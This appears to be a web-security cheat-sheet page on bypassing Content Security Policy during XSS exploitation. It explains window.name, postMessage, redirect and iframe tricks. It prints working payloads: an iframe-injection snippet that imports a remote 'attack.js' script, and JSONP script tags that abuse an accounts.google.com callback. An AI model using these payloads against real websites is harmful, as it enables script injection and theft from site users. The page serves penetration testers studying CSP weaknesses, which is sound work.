---
title: Content Security Policy (CSP)
description: Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross-Site Scripting (XSS) and data injection attacks.
badge: Web
---


CSP can be really anoying when trying to exploit XSSs. Here are a couple of ways to overcome this limitation.
First of all you can analyze the policy using the csp-evaluator by Google to quickly check what's available to you:

* [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com/)

CSP can be defined both as HTTP responese headers, and included inside `<meta>` like the following:

``` html
<meta http-equiv="Content-Security-Policy" content="{{ csp-policy default-src 'self' cdn.example.com;}}">
```

## Abusing `window.name`

> Can be abused on the most restricted CSP environments, but works **only in Chrome**.

Anything stored on the `name` / `window.name` variable will be shared between sites on the same browser tab. This menas that if _attacker-site_ sets the variable with any value, this will be preserved when redirected to a completely different site.

## Iframing non-protected pages

If you find an XSS vector in one resource but it's protected by CSP, there might be another resource on the same origin without said protections where you can inject arbitrary scripts using iframes.

> This should work on virtually every browser. The main drawback is the payload size, which depending on the resource you want to inject and the URL lenght for the script you want to load, might be longer than available for scenarios like stored XSS.

The idea is that, if you pop an XSS on the `/search` resource, you can use that to iframe and inject arbitrary scripts on a <smart-variable variable="non-protected-page" default-value="/robots.txt"></smart-variable> resource without CSP.

A fairly short XSS payload would be the following:

<smart-tabs variable="js-minified" :tabs="{'regular': 'Regular', 'minified': 'Minified'}">
<template v-slot:regular>

``` js
f = document.createElement("iframe")
document.body.appendChild(f).src = "{{ non-protected-page /robots.txt }}"
f.onload = () => f.contentDocument.body.innerHTML = "&lt;style onload=import('{{ remote-script //localhost:8888/attack.js }}')>"
```

</template>
<template v-slot:minified>

``` js
f=document.createElement("iframe"),document.body.appendChild(f).src="{{ non-protected-page /robots.txt }}",f.onload=()=>f.contentDocument.body.innerHTML="&lt;style onload=import('{{ remote-script //localhost:8888/attack.js }}')>"
```

</template>
</smart-tabs>

I'm using `<style onload=import` to load the script on the non-protected resource because it's a fairly short payload, but you can try any other payload.

> Iframes have to be allowed for the resource, but if it has no CSP or overly-permissive CSP, it's unlikely that iframing is disallowed from the same origin.

## Abusing `postMessage`

Less of a pain to use than `window.name`, can be used in environments with a not as restrictive CSP. As an example, if `script-src` is restricted, it would be possible to load scripts by passing code through `postMessage`

> Should work on any modern browser if allowed through the website's Content Security Policy

## Abusing JSONP

When no `unsafe-inline` is allowed, and only scripts served from a specific source can be loaded, there's still the possiblity of abusing JSONP endpoints if present.
Your XSS should look similar to the following:

``` html
<script src="{{ jsonp-endpoint /l/es.json?callback= }}{{ xss-payload alert(document.domain)} url }%2F%2F">
```

The JSONP endpoint can be located at any source allowed by the CSP.
There's a lot of publicly available endpoints from many interesting domains; for exaple, if `*.google.com` or `accounts.google.com` is allowed you could use the following:

``` html
<script src="https://accounts.google.com/o/oauth2/revoke?callback={{ xss-payload alert(document.domain)} url }%2F%2F">
```

There's plenty of such resources, you can find more on the following repo:

* [github.com/zigoo0/JSONBee](https://github.com/zigoo0/JSONBee)

Default JSONP endpoints provided by frameworks or stacked technologies, such as Wordpress, are usually protected against this, having many characters blocked by default. This means that if you are attacking a Wordpress site, it will most likely have an exposed JSONP endpoint, but it will be very difficult to abuse for this purpose. However, this is definetely doable with complex payloads using stuff like Same Origin Method Execution[^1][^2][^3]

## Bypass path restrictions with redirections

CSP allows you to also specify paths in order to restrict the sources where content can be loaded.
The paths are completely ignored after redirects, but any domain the browser requests must be allowed by the CSP.
If you have an open-redirect gadget, it might be useful for this.

[^1]: **Bypass CSP Using WordPress By Abusing Same Origin Method Execution** - [octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)
[^2]: **SOME Attack** - [www.someattack.com/Playground/About](https://www.someattack.com/Playground/About)
[^3]: #HITB2017AMS D2T1 - **Everybody Wants SOME: Advance Same Origin Method Execution** - Ben Hayak - [youtu.be/OvarkOxxdic](https://youtu.be/OvarkOxxdic)
